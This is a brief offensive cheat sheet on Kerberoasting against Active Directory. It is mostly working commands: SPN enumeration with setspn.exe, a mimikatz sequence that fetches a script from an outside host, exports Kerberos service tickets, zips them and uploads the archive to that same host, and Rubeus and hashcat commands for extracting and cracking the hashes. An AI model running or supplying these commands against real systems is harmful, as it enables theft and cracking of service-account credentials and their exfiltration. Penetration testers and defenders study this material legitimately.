
## Summary

Kerberoasting is an attack that abuses the Kerberos protocol to harvest password hashes for Active Directory user accounts with servicePrincipalName (SPN) values — i.e., service accounts.
### Enumerate service accounts SPNs with setspn.exe
**Service Principal Names** (or SPNs) are identifiers used by Kerberos to associate a service account with a particular host. On a windows host, an attacker may enumerate SPNs using `setspn.exe` :
```cmd
setspn.exe -Q */*
```

## Roasting with mimikatz
```
Invoke-WebRequest http://172.16.139.10:44444/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T TRILOCOR.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
$results = .\mimikatz.exe base64 /out:true "kerberos::list /export" exit
mkdir kirb; move *.kirbi .\kirb\
Compress-Archive -Path .\kirb -DestinationPath .\kerberoast.zip
(new-object system.net.webclient).UploadFile("http://172.16.139.10:44444/","kerberoast.zip")
```
## Roasting with rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Then crack with :
hashcat -m 13100 --force -a 0 hashes.kerberoast
```